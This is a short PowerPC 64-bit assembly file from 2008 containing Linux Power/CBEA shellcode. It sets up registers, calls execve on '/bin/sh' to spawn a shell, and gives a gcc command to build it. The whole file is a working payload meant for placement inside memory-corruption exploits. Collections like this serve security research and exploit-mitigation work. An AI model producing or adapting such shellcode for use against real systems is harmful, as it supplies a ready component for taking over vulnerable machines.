/*
 *  $Id: lin-power-shellcode64.S 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-power-shellcode64.S - Linux Power/CBEA shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -o lin-power-shellcode64 lin-power-shellcode64.S
 *
 */

#include "linux-power.h"

    .globl main

main:

shellcode64:
    lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode64
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r3,-511+36(%r30)
    stb     %r5,-511+43(%r30)
    stdu    %r5,-8(%r1)
    stdu    %r3,-8(%r1)
    mr      %r4,%r1
    cal     %r0,__NC_execve(%r31)
    .long   0x44ffff02
    .asciz  "/bin/sh"

